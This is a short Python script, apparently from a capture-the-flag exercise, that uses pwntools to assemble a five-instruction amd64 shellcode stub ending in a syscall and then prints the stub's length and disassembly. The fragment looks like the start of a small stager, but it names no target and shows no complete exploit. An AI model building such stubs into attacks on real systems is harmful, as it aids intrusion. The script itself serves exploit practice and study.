from pwn import*
context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])

m = ''
m += 'mov esi, eax;'
m += 'pop rax;'
m += 'pop rdx;'
m += 'pop rax;'
m += 'syscall;'
payload = asm(m)

print('长度=' + str(len(payload)))
print(disasm(payload))
